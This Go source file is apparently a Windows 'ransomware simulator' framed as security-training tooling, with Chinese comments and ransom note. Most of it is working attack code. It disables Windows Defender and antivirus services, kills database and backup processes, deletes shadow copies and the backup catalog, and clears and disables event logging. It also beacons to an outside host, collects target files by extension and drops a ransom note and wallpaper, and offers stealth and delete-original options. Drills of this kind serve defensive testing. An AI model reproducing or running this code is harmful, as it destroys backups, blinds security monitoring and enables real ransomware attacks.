// ransom_simulator_windows.go
package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	_ "embed"
	"encoding/binary"
	"encoding/json"
	"encoding/pem"
	"flag"
	"fmt"
	"io"
	mrand "math/rand"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
	"unsafe"
)

const (
	version   = "v3.6"
	apiURL    = "https://encrypt.yangzifun.org/E56dSY"
	beaconURL = "https://encrypt.yangzifun.org/beacon_check_in"

	largeFileThreshold = 1 * 1024 * 1024 * 1024
	chunkSize          = 1 * 1024 * 1024
	headChunks         = 1
	tailChunks         = 1
	middleRandomChunks = 5
)

const ransomNoteContent = `
   [ 安全培训模拟演练通知 ]

您的部分文件已被程序处理（锁定）。

问：发生了什么？
答：这是一个受控的安全培训模拟演练。您的计算机中部分重要文件（包括文档、
照片、数据库、备份等）已被模拟处理（锁定）。在真实攻击场景中，如果没有
攻击者持有的私钥，这些文件将无法恢复。

问：如何恢复我的文件？
答：请通过以下方式获取恢复工具和密钥：

1. 访问模拟恢复页面: https://encrypt.yangzifun.org/
2. 输入您的唯一个人ID: %s

本程序不会对原文件进行删除操作。如遇原文件丢失，可通过上方链接获取私钥及恢复程序。

[!] 这是一次安全培训模拟演练 [!]

不要惊慌！这是一个受控的模拟演练。但如果这是一次真实的攻击，你的网络
已经被完全攻陷。请借此机会评估和加强您的安全防护措施。

项目仓库链接：https://git.yangzifun.org/YZFN/ransom_simulator

免责声明与许可：
本项目遵循 MIT 许可证，请查阅 LICENSE 文件了解详情。
此工具的创建旨在赋能防御者，而非赋能攻击者。请在法律和道德允许的范围内负责任地使用。

`

//go:embed wallpaper.ps1
var wallpaperScript string

var (
	lockFilePath            string
	ransomNoteFileName      = "!!!_如何解密你的文件_!!!.txt"
	ransomWallpaperFileName = "ransom_wallpaper.png"

	// 日志相关变量
	logEnabled        bool
	logDirectory      string
	successLogFile    *os.File
	failedLogFile     *os.File
	operationsLogFile *os.File

	// 公钥缓存，避免重复解析
	publicKeyCache     *rsa.PublicKey
	publicKeyCacheStr  string
	publicKeyCacheLock sync.RWMutex

	// 程序所在目录
	programDir string

	// 公钥变量
	publicKeyPEM string

	// 阶段2行为控制变量
	stealthMode     bool
	noStopServices  bool
	noKillProcs     bool
	noClearLogs     bool
	aggressiveDelay int

	// 目标进程列表
	targetProcessesWindows = []string{
		"notepad.exe", "wordpad.exe", "winword.exe", "excel.exe", "powerpnt.exe",
		"mspaint.exe", "sqlservr.exe", "mysqld.exe", "oracle.exe", "outlook.exe",
		"thunderbird.exe", "steam.exe", "code.exe", "powershell.exe", "cmd.exe",
		// 数据库相关进程
		"sqlwriter.exe", "sqlbrowser.exe", "mysql.exe", "pg_ctl.exe", "mongod.exe",
		"redis-server.exe", "sqlplus.exe",
		// 安全软件进程
		"mcshield.exe", "avp.exe", "bdagent.exe", "SophosUI.exe", "SEP.exe",
		"avastui.exe", "avgui.exe", "kav.exe", "kis.exe",
		// 备份软件进程
		"vssvc.exe", "wbengine.exe", "ntbackup.exe", "backupexec.exe",
	}

	// Windows数据库和安全服务
	windowsDatabaseServices = []string{
		"MSSQLSERVER", "SQLSERVERAGENT", "SQLWriter", "SQLBrowser",
		"MySQL80", "MySQL57", "PostgreSQL", "MongoDB",
		"Redis", "OracleServiceXE", "OracleServiceORCL",
	}

	windowsSecurityServices = []string{
		"WinDefend", "SecurityHealthService", "WdNisSvc", "Sense",
		"McAfeeFramework", "McShield", "SophosAgent", "SophosAlertService",
		"SEPMasterService", "SEPScanner", "SEPMonitoring", "AvastSvc",
		"AVGSvc", "Kaspersky Anti-Virus Service", "Kaspersky Security Center",
	}

	// 排除目录
	excludedDirsWindows = []string{
		"C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)",
		"System Volume Information", "$Recycle.Bin", "C:\\ProgramData",
		"C:\\System32", "C:\\SysWOW64", "C:\\Windows.old",
	}

	// 目标扩展名（增强版）
	targetExtensions = []string{
		// 文档文件
		".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
		".odt", ".csv", ".txt", ".rtf", ".md", ".tex", ".epub", ".one",
		// 网页文件
		".html", ".htm", ".xhtml", ".mht", ".mhtml",
		// 压缩文件
		".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz", ".tgz",
		// 图片文件
		".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tif", ".tiff",
		".svg", ".webp", ".ico", ".psd", ".ai", ".eps",
		// 数据库文件
		".sql", ".db", ".mdb", ".accdb", ".sqlite", ".sqlite3",
		".dbf", ".mdf", ".ndf", ".ldf", ".frm", ".ibd", ".myd",
		".myi", ".ibdata", ".ora", ".dmp", ".exp", ".imp", ".pdb",
		".wal", ".journal", ".rdb", ".aof", ".dump",
		// 配置文件
		".conf", ".cfg", ".ini", ".yml", ".yaml", ".xml", ".json",
		".properties", ".env", ".toml", ".config",
		// 备份文件
		".bak", ".backup", ".old", ".temp", ".tmp", ".swp", ".~*",
		// 代码文件
		".go", ".py", ".java", ".cpp", ".c", ".h", ".js", ".ts",
		".php", ".rb", ".pl", ".sh", ".bash", ".ps1", ".bat",
		// 虚拟化和容器文件
		".vmdk", ".vhd", ".vhdx", ".qcow2", ".ova", ".ovf",
		".dockerfile", ".dockerignore", ".vbox",
		// 其他重要文件
		".key", ".pem", ".crt", ".cer", ".pfx", ".p12",
		".pcap", ".log", ".tar.gz", ".tar.bz2",
	}

	// Windows数据库数据目录
	windowsDatabaseDataDirs = []string{
		"C:\\ProgramData\\MySQL\\MySQL Server\\Data",
		"C:\\Program Files\\MySQL\\MySQL Server\\Data",
		"C:\\Program Files (x86)\\MySQL\\MySQL Server\\Data",
		"C:\\Program Files\\PostgreSQL\\data",
		"C:\\Program Files (x86)\\PostgreSQL\\data",
		"C:\\Program Files\\Microsoft SQL Server\\MSSQL\\DATA",
		"C:\\Program Files (x86)\\Microsoft SQL Server\\MSSQL\\DATA",
		"C:\\MongoDB\\data",
		"D:\\MongoDB\\data",
		"C:\\Redis\\data",
		"C:\\Oracle\\oradata",
		"D:\\Oracle\\oradata",
	}

	// 加密随机数读取器
	cryptoReader = rand.Reader
)

type APIResponse struct {
	PublicKeyPEM string `json:"public_key_pem"`
	UUID         string `json:"uuid"`
	Status       string `json:"status"`
	Message      string `json:"message"`
}

type fileLog struct {
	mu   sync.Mutex
	file *os.File
}

type counters struct {
	success atomic.Uint64
	failed  atomic.Uint64
}

type encryptedChunk struct {
	Offset int64  `json:"offset"`
	Size   int    `json:"size"`
	Nonce  []byte `json:"nonce"`
	Data   []byte `json:"data"`
}

type chunkInfo struct {
	Offset int64
	Size   int64
}

func main() {
	forceReleaseLock()

	fmt.Println("==================================================")
	fmt.Println("      勒索软件模拟器 - Windows增强版      ")
	fmt.Printf("                版本: %s\n", version)
	fmt.Println("==================================================")
	time.Sleep(1 * time.Second)

	// 获取程序所在目录
	initProgramDir()

	fmt.Println("\n[阶段 1: 渗透与持久化]")
	fmt.Print("[*] 通过互斥锁建立持久化... ")
	if !createSingleInstanceLock() {
		fmt.Println("失败. [IOC] 检测到另一个实例正在运行。程序终止。")
		os.Exit(1)
	}
	fmt.Println("成功.")
	defer cleanupLockFile()

	fs := flag.NewFlagSet("ransom_simulator", flag.ExitOnError)
	workersFlag, dryRunFlag, extensionsFlag, directoryFlag, removeFlag, logFlag, stealthFlag, noStopSvcFlag, noKillFlag, noClearFlag, delayFlag := setupFlags(fs)
	if err := fs.Parse(os.Args[1:]); err != nil {
		_, _ = fmt.Fprintf(os.Stderr, "错误: 解析命令行参数失败: %v\n", err)
		os.Exit(1)
	}

	stealthMode = *stealthFlag
	noStopServices = *noStopSvcFlag
	noKillProcs = *noKillFlag
	noClearLogs = *noClearFlag
	aggressiveDelay = *delayFlag

	initLogging(*logFlag)
	defer closeLogFiles()

	showWarning(*dryRunFlag)
	fmt.Println("\n[阶段 2: 防御规避与发现]")
	if *dryRunFlag {
		fmt.Println("[*] [演习模式] 跳过所有破坏性操作。")
	} else {
		go networkBeacon()

		if !noStopServices {
			fmt.Println("\n[+] 停止数据库和安全服务...")
			stopWindowsServices()
			stopSecurityServices()
		} else {
			fmt.Println("\n[*] [跳过] 停止服务操作")
		}

		fmt.Println("\n[+] 清理数据库内存和缓存...")
		cleanWindowsDatabaseMemory()
		cleanDatabaseMemory()

		if !noKillProcs {
			killLockingProcesses()
		} else {
			fmt.Println("\n[*] [跳过] 终止占用文件的进程")
		}

		if !noClearLogs {
			simulateDestructiveActions()
		} else {
			fmt.Println("\n[*] [跳过] 清除备份和日志文件")
		}

		if stealthMode {
			fmt.Println("\n[+] [隐身模式] 执行额外清理...")
			disableProcessWatchdogs()
			unmountDatabaseConnections()
			clearSystemCache()
		}
	}

	extFilter := make(map[string]bool)
	if *extensionsFlag != "" {
		exts := strings.Split(*extensionsFlag, ",")
		for _, ext := range exts {
			ext = strings.TrimSpace(ext)
			if ext != "" {
				if !strings.HasPrefix(ext, ".") {
					ext = "." + ext
				}
				extFilter[strings.ToLower(ext)] = true
			}
		}
		fmt.Printf("[*] 使用指定的扩展名: %v\n", getKeys(extFilter))
	} else {
		for _, ext := range targetExtensions {
			extFilter[ext] = true
		}
		fmt.Println("[*] 使用增强扩展名列表 (包含数据库文件、配置文件、备份文件等)")
	}

	var scanRoots []string
	encryptAllFormats := false
	if *directoryFlag != "" {
		dirs := strings.Split(*directoryFlag, ",")
		for _, dir := range dirs {
			dir = strings.TrimSpace(dir)
			if dir != "" {
				scanRoots = append(scanRoots, dir)
			}
		}
		fmt.Printf("[*] 扫描指定目录: %v\n", scanRoots)
		if len(scanRoots) > 0 {
			encryptAllFormats = true
			fmt.Println("[*] 目录定位模式已激活: 将加密指定目录下的【所有格式】文件")
		}
	}

	fmt.Println("[*] 正在扫描文件系统以查找有价值的目标...")
	filesToProcess := scanFiles(extFilter, scanRoots, encryptAllFormats)
	if len(filesToProcess) == 0 {
		fmt.Println("[!] 未找到任何有价值的目标文件。任务中止。")
		os.Exit(0)
	}
	fmt.Printf("[+] 目标捕获完成。已识别 %d 个待加密文件。\n", len(filesToProcess))

	var stats counters
	var finalUUID = "本地密钥模式"
	if *dryRunFlag {
		fmt.Println("\n[阶段 3: 载荷部署 (演习模式下跳过)]")
		fmt.Println("[*] 以下文件在真实攻击中将被加密:")
		for _, f := range filesToProcess {
			fmt.Println("  -", f)
		}
	} else {
		fmt.Println("\n[阶段 3: 载荷部署]")
		fmt.Printf("[*] 初始化 %d 个加密线程。开始执行载荷...\n", *workersFlag)
		runEncryptionWorkers(filesToProcess, *workersFlag, &stats, &finalUUID, *removeFlag)
		fmt.Println("\n[+] 载荷执行完毕。")
	}

	if !*dryRunFlag {
		fmt.Println("\n[阶段 4: 勒索信增强]")
		noteContent := fmt.Sprintf(ransomNoteContent, finalUUID)
		userProfile, err := os.UserHomeDir()
		if err == nil {
			desktopPath := filepath.Join(userProfile, "Desktop")
			_ = os.WriteFile(filepath.Join(desktopPath, ransomNoteFileName), []byte(noteContent), 0644)
		}
		createRansomWallpaper(finalUUID)
	}

	fmt.Println("\n================== [ 任务完成 ] ==================")
	if *dryRunFlag {
		fmt.Printf("  - 模式:            演习模式 (Dry Run)\n")
		fmt.Printf("  - 发现目标:        %d\n", len(filesToProcess))
	} else {
		fmt.Printf("  - 模式:            实时攻击\n")
		fmt.Printf("  - 已加密文件:      %d\n", stats.success.Load())
		fmt.Printf("  - 加密失败:        %d\n", stats.failed.Load())
	}

	// 输出日志文件位置
	if logEnabled {
		fmt.Println("\n================== [ 日志文件 ] ==================")
		fmt.Printf("  - 成功日志:        %s\n", filepath.Join(logDirectory, "success_encrypted.log"))
		fmt.Printf("  - 失败日志:        %s\n", filepath.Join(logDirectory, "failed_encrypted.log"))
		fmt.Printf("  - 操作日志:        %s\n", filepath.Join(logDirectory, "operations.log"))
		fmt.Println("====================================================")
	}

	countdown("此终端将在", 10)
}

// 初始化程序所在目录
func initProgramDir() {
	exePath, err := os.Executable()
	if err != nil {
		// 如果无法获取可执行文件路径，则使用当前工作目录
		programDir, _ = os.Getwd()
		fmt.Printf("[!] 警告: 无法获取程序路径，使用当前工作目录: %s\n", programDir)
	} else {
		programDir = filepath.Dir(exePath)
		fmt.Printf("[*] 程序所在目录: %s\n", programDir)
	}
}

// 从公钥文件名中提取UUID
func extractUUIDFromFilename() (string, error) {
	// 扫描程序目录中的文件，查找公钥文件
	files, err := os.ReadDir(programDir)
	if err != nil {
		return "", fmt.Errorf("无法读取程序目录: %w", err)
	}

	// 正则表达式匹配公钥文件名格式
	pattern := regexp.MustCompile(`^public_key_([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})\.pem$`)

	for _, file := range files {
		if file.IsDir() {
			continue
		}

		matches := pattern.FindStringSubmatch(file.Name())
		if matches != nil && len(matches) == 2 {
			uuid := matches[1]
			if isValidUUID(uuid) {
				fmt.Printf("[*] 从文件名提取UUID: %s\n", uuid)
				return uuid, nil
			}
		}
	}

	return "", fmt.Errorf("未找到有效的公钥文件。请确保程序目录中存在公钥文件，格式为: public_key_<uuid>.pem")
}

// 验证UUID格式
func isValidUUID(uuid string) bool {
	if len(uuid) != 36 {
		return false
	}

	// 检查格式: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx
	parts := strings.Split(uuid, "-")
	if len(parts) != 5 {
		return false
	}

	lengths := []int{8, 4, 4, 4, 12}
	for i, part := range parts {
		if len(part) != lengths[i] {
			return false
		}
		// 检查是否为十六进制字符
		for _, ch := range part {
			if !((ch >= '0' && ch <= '9') || (ch >= 'a' && ch <= 'f') || (ch >= 'A' && ch <= 'F')) {
				return false
			}
		}
	}

	return true
}

// 从本地PEM文件读取公钥
func readPublicKeyFromFile(uuid string) (string, error) {
	// 构造文件名
	fileName := fmt.Sprintf("public_key_%s.pem", uuid)
	filePath := filepath.Join(programDir, fileName)

	// 检查文件是否存在
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return "", fmt.Errorf("公钥文件不存在: %s", filePath)
	}

	// 读取文件内容
	content, err := os.ReadFile(filePath)
	if err != nil {
		return "", fmt.Errorf("读取公钥文件失败: %w", err)
	}

	// 验证PEM格式
	pemBlock, _ := pem.Decode(content)
	if pemBlock == nil {
		return "", fmt.Errorf("无效的PEM格式: %s", filePath)
	}

	// 验证公钥类型
	if pemBlock.Type != "PUBLIC KEY" && pemBlock.Type != "RSA PUBLIC KEY" {
		return "", fmt.Errorf("不是有效的公钥文件: 类型应为 'PUBLIC KEY' 或 'RSA PUBLIC KEY'，实际为 '%s'", pemBlock.Type)
	}

	// 尝试解析以验证有效性
	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		// 尝试PKCS1格式
		pub, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes)
		if err != nil {
			return "", fmt.Errorf("解析公钥失败: %w", err)
		}
	}

	_, ok := pub.(*rsa.PublicKey)
	if !ok {
		return "", fmt.Errorf("公钥不是RSA类型")
	}

	if logEnabled {
		logOperation(fmt.Sprintf("从本地文件读取公钥: %s", filePath))
	}

	return string(content), nil
}

// 初始化日志系统
func initLogging(enableLog bool) {
	logEnabled = enableLog
	if !logEnabled {
		return
	}

	// 使用程序所在目录作为日志目录
	logDirectory = programDir

	fmt.Printf("[*] 日志系统已启用，日志将输出到: %s\n", logDirectory)

	// 创建日志文件
	var err1, err2, err3 error
	successLogFile, err1 = os.OpenFile(
		filepath.Join(logDirectory, "success_encrypted.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	failedLogFile, err2 = os.OpenFile(
		filepath.Join(logDirectory, "failed_encrypted.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	operationsLogFile, err3 = os.OpenFile(
		filepath.Join(logDirectory, "operations.log"),
		os.O_CREATE|os.O_WRONLY|os.O_APPEND,
		0644,
	)

	if err1 != nil || err2 != nil || err3 != nil {
		fmt.Printf("[!] 无法创建日志文件: success=%v, failed=%v, operations=%v\n", err1, err2, err3)
		logEnabled = false
	} else {
		// 写入日志文件头
		timestamp := time.Now().Format("2006-01-02 15:04:05")
		header := fmt.Sprintf("=================== 勒索软件模拟器日志 ===================\n")
		header += fmt.Sprintf("程序版本: %s\n", version)
		header += fmt.Sprintf("开始时间: %s\n", timestamp)
		header += fmt.Sprintf("运行参数: %s\n", strings.Join(os.Args, " "))
		header += fmt.Sprintf("工作目录: %s\n", programDir)
		header += fmt.Sprintf("=========================================================\n\n")

		_, _ = successLogFile.WriteString(header)
		_, _ = failedLogFile.WriteString(header)
		_, _ = operationsLogFile.WriteString(header)
	}
}

// 关闭日志文件
func closeLogFiles() {
	if logEnabled {
		if successLogFile != nil {
			_ = successLogFile.Close()
		}
		if failedLogFile != nil {
			_ = failedLogFile.Close()
		}
		if operationsLogFile != nil {
			_ = operationsLogFile.Close()
		}
	}
}

// 记录成功加密的文件
func logSuccess(filePath string) {
	if !logEnabled || successLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] SUCCESS: %s -> %s.encrypted\n",
		timestamp, filePath, filePath)

	successLogFile.WriteString(logEntry)

	// 同时记录到操作日志
	logOperation(fmt.Sprintf("成功加密: %s", filePath))
}

// 记录加密失败的文件
func logFailed(filePath string, errorMsg string) {
	if !logEnabled || failedLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] FAILED: %s - %s\n",
		timestamp, filePath, errorMsg)

	failedLogFile.WriteString(logEntry)

	// 同时记录到操作日志
	logOperation(fmt.Sprintf("加密失败: %s - %s", filePath, errorMsg))
}

// 记录操作日志
func logOperation(message string) {
	if !logEnabled || operationsLogFile == nil {
		return
	}

	timestamp := time.Now().Format("2006-01-02 15:04:05")
	logEntry := fmt.Sprintf("[%s] %s\n", timestamp, message)

	operationsLogFile.WriteString(logEntry)
}

// 获取或解析公钥（带缓存）
func getPublicKey(publicKeyStr string) (*rsa.PublicKey, error) {
	publicKeyCacheLock.RLock()
	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
		publicKeyCacheLock.RUnlock()
		return publicKeyCache, nil
	}
	publicKeyCacheLock.RUnlock()

	// 解析公钥
	publicKeyCacheLock.Lock()
	defer publicKeyCacheLock.Unlock()

	// 再次检查，防止并发重复解析
	if publicKeyCache != nil && publicKeyCacheStr == publicKeyStr {
		return publicKeyCache, nil
	}

	// 清理公钥字符串，确保格式正确
	cleanedKeyStr := strings.TrimSpace(publicKeyStr)

	// 检查PEM格式
	if !strings.HasPrefix(cleanedKeyStr, "-----BEGIN") {
		// 尝试添加PEM头
		cleanedKeyStr = fmt.Sprintf("-----BEGIN PUBLIC KEY-----\n%s\n-----END PUBLIC KEY-----", cleanedKeyStr)
	}

	// 解码PEM
	pemBlock, _ := pem.Decode([]byte(cleanedKeyStr))
	if pemBlock == nil {
		// 尝试不同的PEM格式
		if strings.Contains(cleanedKeyStr, "RSA PUBLIC KEY") {
			cleanedKeyStr = strings.Replace(cleanedKeyStr, "RSA PUBLIC KEY", "PUBLIC KEY", 1)
			pemBlock, _ = pem.Decode([]byte(cleanedKeyStr))
		}

		if pemBlock == nil {
			return nil, fmt.Errorf("解码PEM公钥失败: 无效的PEM格式")
		}
	}

	// 解析公钥
	pub, err := x509.ParsePKIXPublicKey(pemBlock.Bytes)
	if err != nil {
		// 尝试解析PKCS1格式
		pub, err = x509.ParsePKCS1PublicKey(pemBlock.Bytes)
		if err != nil {
			return nil, fmt.Errorf("解析公钥失败: %w", err)
		}
	}

	rsaPubKey, ok := pub.(*rsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("公钥不是RSA类型")
	}

	// 更新缓存
	publicKeyCache = rsaPubKey
	publicKeyCacheStr = publicKeyStr

	return rsaPubKey, nil
}

// 新增功能：停止Windows服务
func stopWindowsServices() {
	if logEnabled {
		logOperation("开始停止Windows服务")
	}

	// 停止数据库服务
	for _, service := range windowsDatabaseServices {
		fmt.Printf("  - 停止数据库服务: %s\n", service)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试停止数据库服务: %s", service))
		}

		// 使用sc命令停止服务
		cmd := exec.Command("sc", "stop", service)
		_ = cmd.Run()

		// 使用net命令停止服务
		cmd = exec.Command("net", "stop", service)
		_ = cmd.Run()

		// 禁用服务
		cmd = exec.Command("sc", "config", service, "start=", "disabled")
		_ = cmd.Run()

		time.Sleep(100 * time.Millisecond)
	}

	// 停止安全服务
	for _, service := range windowsSecurityServices {
		fmt.Printf("  - 停止安全服务: %s\n", service)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试停止安全服务: %s", service))
		}

		// 使用sc命令停止服务
		cmd := exec.Command("sc", "stop", service)
		_ = cmd.Run()

		// 使用net命令停止服务
		cmd = exec.Command("net", "stop", service)
		_ = cmd.Run()

		// 尝试杀死相关进程
		serviceExe := strings.ToLower(service)
		cmd = exec.Command("taskkill", "/F", "/IM", serviceExe+".exe")
		_ = cmd.Run()

		time.Sleep(100 * time.Millisecond)
	}

	// 停止Windows Defender
	fmt.Println("  - 停止Windows Defender...")
	if logEnabled {
		logOperation("尝试停止Windows Defender")
	}

	// 停止实时保护
	cmd := exec.Command("powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true")
	_ = cmd.Run()

	// 停止扫描服务
	cmd = exec.Command("powershell", "-Command", "Set-MpPreference -DisableScanning $true")
	_ = cmd.Run()

	if logEnabled {
		logOperation("Windows服务停止完成")
	}
}

// 新增功能：清理Windows数据库内存
func cleanWindowsDatabaseMemory() {
	if logEnabled {
		logOperation("开始清理Windows数据库内存和缓存")
	}

	fmt.Println("  - 清理SQL Server缓存...")

	if logEnabled {
		logOperation("清理SQL Server缓存")
	}

	// 清理SQL Server缓存
	cleanSQLServerCache()

	fmt.Println("  - 清理系统内存...")

	if logEnabled {
		logOperation("清理系统内存")
	}

	// 清理系统内存
	cmd := exec.Command("powershell", "-Command", "Clear-EventLog -LogName Application, System, Security")
	_ = cmd.Run()

	// 清理DNS缓存
	cmd = exec.Command("ipconfig", "/flushdns")
	_ = cmd.Run()

	if logEnabled {
		logOperation("Windows数据库内存和缓存清理完成")
	}
}

func cleanSQLServerCache() {
	// 尝试使用SQLCMD清理缓存
	cleanCommands := []string{
		"DBCC DROPCLEANBUFFERS",
		"DBCC FREEPROCCACHE",
		"DBCC FREESYSTEMCACHE ('ALL')",
		"DBCC FREESESSIONCACHE",
	}

	for _, sqlCmd := range cleanCommands {
		cmd := exec.Command("sqlcmd", "-Q", sqlCmd)
		_ = cmd.Run()
	}
}

func killLockingProcesses() {
	fmt.Println("\n[+] 终止占用文件的进程...")

	if logEnabled {
		logOperation("开始终止占用文件的进程")
	}

	for _, proc := range targetProcessesWindows {
		fmt.Printf("  - 终止进程: %s\n", proc)

		if logEnabled {
			logOperation(fmt.Sprintf("尝试终止进程: %s", proc))
		}

		cmd := exec.Command("taskkill", "/F", "/IM", proc)
		_ = cmd.Run()
	}
	time.Sleep(1 * time.Second)

	if logEnabled {
		logOperation("进程终止完成")
	}
}

func forceReleaseLock() {
	lockPath := filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
	_ = os.Remove(lockPath)
}

func createSingleInstanceLock() bool {
	lockFilePath = filepath.Join(os.TempDir(), "ransom_simulator_instance.lock")
	file, err := os.OpenFile(lockFilePath, os.O_CREATE|os.O_EXCL, 0666)
	if err != nil {
		return false
	}
	_ = file.Close()
	return true
}

func cleanupLockFile() {
	if lockFilePath != "" {
		_ = os.Remove(lockFilePath)
	}
}

func setupFlags(fs *flag.FlagSet) (*int, *bool, *string, *string, *bool, *bool, *bool, *bool, *bool, *bool, *int) {
	workers := fs.Int("workers", runtime.NumCPU(), "并发 worker 数量")
	dryRun := fs.Bool("dry-run", false, "演习模式")
	extensions := fs.String("ext", "", "指定要加密的文件扩展名 (e.g., '.txt,.pdf')")
	directory := fs.String("dir", "", "指定目标 (目录或单个文件); 将忽略扩展名限制")
	removeOriginal := fs.Bool("remove", false, "加密后删除原文件")
	logFlag := fs.Bool("log", false, "启用日志功能，在程序所在目录输出日志文件")
	stealthFlag := fs.Bool("stealth-mode", false, "隐身模式：执行额外清理操作")
	noStopSvcFlag := fs.Bool("no-stop-services", false, "跳过停止服务操作")
	noKillFlag := fs.Bool("no-kill-procs", false, "跳过终止进程操作")
	noClearFlag := fs.Bool("no-clear-logs", false, "跳过清除日志操作")
	delayFlag := fs.Int("aggressive-delay", 0, "操作间随机延迟上限（毫秒），0=无延迟")

	fs.Usage = func() {
		_, _ = fmt.Fprintf(os.Stderr, "用法: %s [flags]\n", os.Args[0])
		_, _ = fmt.Fprintf(os.Stderr, "密钥获取优先级: 1) API接口获取 2) 本地公钥文件\n")
		_, _ = fmt.Fprintf(os.Stderr, "本地公钥文件格式:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - public_key_<uuid>.pem: 公钥文件，例如 public_key_5137d4c3-3901-4528-bfa9-6d9ce88fa287.pem\n")
		_, _ = fmt.Fprintf(os.Stderr, "注意: 当API不可用时，UUID将从公钥文件名中自动提取\n")
		_, _ = fmt.Fprintf(os.Stderr, "日志文件将输出到程序所在目录:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - success_encrypted.log: 成功加密的文件列表\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - failed_encrypted.log:  加密失败的文件列表\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - operations.log:        操作日志\n")
		_, _ = fmt.Fprintf(os.Stderr, "行为控制:\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --stealth-mode:       隐身模式，执行额外清理\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --no-stop-services:   跳过停止数据库和安全服务\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --no-kill-procs:      跳过终止占用文件的进程\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --no-clear-logs:      跳过清除备份和日志文件\n")
		_, _ = fmt.Fprintf(os.Stderr, "  - --aggressive-delay:   操作间随机延迟上限（毫秒）\n")
		fs.PrintDefaults()
	}
	return workers, dryRun, extensions, directory, removeOriginal, logFlag, stealthFlag, noStopSvcFlag, noKillFlag, noClearFlag, delayFlag
}

func showWarning(dryRun bool) {
	_, _ = fmt.Fprintf(os.Stderr, "\n************************** 警告 **************************\n")
	_, _ = fmt.Fprintf(os.Stderr, "此程序将自动扫描并加密指定范围内的文件。\n")
	_, _ = fmt.Fprintf(os.Stderr, "这是一个高度危险的模拟，请确保在隔离的环境中运行！\n")
	_, _ = fmt.Fprintf(os.Stderr, "**********************************************************\n\n")
	if dryRun {
		fmt.Println(">>> 已激活 [演习模式 (Dry Run)]，不会执行任何加密操作。")
	} else {
		fmt.Println(">>> 警告: 实时攻击模式已激活！将在 3 秒后自动开始...")
		time.Sleep(3 * time.Second)
	}
}

func countdown(message string, seconds int) {
	fmt.Println()
	for i := seconds; i >= 0; i-- {
		fmt.Printf("\r%s %d 秒后自动退出...", message, i)
		time.Sleep(1 * time.Second)
	}
	fmt.Println("\r程序已退出。                                  ")
}

func networkBeacon() {
	time.Sleep(3 * time.Second)
	client := http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(beaconURL)
	if err != nil {
		if logEnabled {
			logOperation(fmt.Sprintf("Beacon check-in 失败: %v", err))
		}
		return
	}
	defer func() { _ = resp.Body.Close() }()

	if logEnabled {
		logOperation(fmt.Sprintf("Beacon check-in 完成, 状态码: %d", resp.StatusCode))
	}
}

func simulateDestructiveActions() {
	time.Sleep(1 * time.Second)
	fmt.Println("\n[+] 执行破坏性操作...")
	fmt.Println("  - [IOC] 模拟: 清除 Shadow Copies...")

	if logEnabled {
		logOperation("开始执行破坏性操作：清除Shadow Copies")
	}

	// 清除卷影副本
	cmd := exec.Command("vssadmin", "delete", "shadows", "/for=C:", "/all", "/quiet")
	_ = cmd.Run()

	fmt.Println("  - [IOC] 模拟: 清除系统备份...")

	// 清除Windows备份
	cmd = exec.Command("wbadmin", "delete", "catalog", "-quiet")
	_ = cmd.Run()

	fmt.Println("  - [IOC] 模拟: 清除系统安全日志...")

	if logEnabled {
		logOperation("清除系统安全日志")
	}

	// 清除Windows事件日志
	cmd = exec.Command("wevtutil", "cl", "Application")
	_ = cmd.Run()

	cmd = exec.Command("wevtutil", "cl", "System")
	_ = cmd.Run()

	cmd = exec.Command("wevtutil", "cl", "Security")
	_ = cmd.Run()

	// 禁用Windows事件日志服务
	cmd = exec.Command("sc", "config", "EventLog", "start=", "disabled")
	_ = cmd.Run()

	cmd = exec.Command("sc", "stop", "EventLog")
	_ = cmd.Run()

	if logEnabled {
		logOperation("破坏性操作完成")
	}

	time.Sleep(1 * time.Second)
}

// ===================== 桌面壁纸（Win32 原生调用） =====================

const (
	spiSetDeskWallpaper = 0x0014
	spifUpdateIniFile   = 0x0001
	spifSendChange      = 0x0002
)

var (
	user32dll = syscall.NewLazyDLL("user32.dll")
	procSPI   = user32dll.NewProc("SystemParametersInfoW")
)

// applyDesktopWallpaper 调用 Win32 API 立即刷新桌面壁纸
func applyDesktopWallpaper(path string) error {
	p, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	ret, _, callErr := procSPI.Call(spiSetDeskWallpaper, 0, uintptr(unsafe.Pointer(p)), spifUpdateIniFile|spifSendChange)
	if ret == 0 {
		return fmt.Errorf("SystemParametersInfoW 调用失败: %v", callErr)
	}
	return nil
}

